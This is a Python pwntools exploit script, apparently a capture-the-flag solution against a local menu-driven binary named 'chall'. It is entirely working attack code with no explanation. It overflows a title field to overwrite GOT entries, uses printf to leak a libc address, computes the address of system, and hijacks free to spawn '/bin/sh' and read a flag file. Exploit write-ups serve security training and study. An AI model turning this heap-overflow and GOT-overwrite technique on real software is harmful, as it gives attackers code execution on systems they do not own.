from pwn import *
p = process('./chall')
#gdb.attach(p)
puts_got = p64(0x0000000000602020)
puts_plt = p64(0x0000000000400670)
printf_plt = p64(0x0000000000400690)
printf_got = p64(0x0000000000602030)
malloc_got = p64(0x0000000000602048)
def add(tsize,dsize):
    p.sendline("1")
    p.recvuntil("Enter size: ")
    p.sendline(str(tsize))
    p.recvuntil("Enter title: ")
    p.sendline("nice")
    p.recvuntil("Enter desc size: ")
    p.sendline("8")
    p.recvuntil("Enter desc: ")
    p.sendline("itsani")
def edit(idx,title,desc):
    p.sendline("2")
    p.recvuntil("Enter index: ")
    p.sendline(str(idx))
    p.recvuntil("Enter title: ")
    p.sendline(title)
    p.recvuntil("Enter desc: ")
    p.sendline(desc)
def delete(idx):
    p.sendline("4")
    p.recvuntil("Enter index: ")
    p.sendline(str(idx))
for i in range(13):
    p.recvuntil('Your Choice > ')
    add(20,20)

p.recvuntil("Your Choice > ")
free_got = p64(0x0000000000602018)
exp = "a"*32 + free_got + p64(0x8)
desc = printf_plt
edit(1,exp,desc)
p.recvuntil("Your Choice > ")
delete(1)

p.recvuntil("Your Choice > ")
add(20,20)
p.recvuntil("Your Choice > ")
add(20,20)
p.recvuntil("Your Choice > ")
exp = "a"*32 + malloc_got + p64(0x1)
edit(1,exp,desc)

p.recvuntil("Your Choice > ")
delete(1)
leak = u64(p.recv(6).strip()+"\x00\x00")
p.recvline()
print hex(leak)
system = leak - 293936
print hex(system)
libc = leak + 1166890

p.recvuntil("Your Choice > ")
add(20,20)
p.recvuntil("Your Choice > ")
add(20,20)
exp = "a"*32 + free_got + p64(0x8)
desc = p64(system)

p.recvuntil("Your Choice > ")
edit(1,exp,desc)
bss = p64(0x00602000 + 0x300)
exp = "/bin/sh" + "a"*25 + bss + p64(0xf)
desc = "cat flag.txt"
p.recvuntil("Your Choice > ")
edit(1,exp,desc)

p.recvuntil("Your Choice > ")
delete(1)
p.interactive()
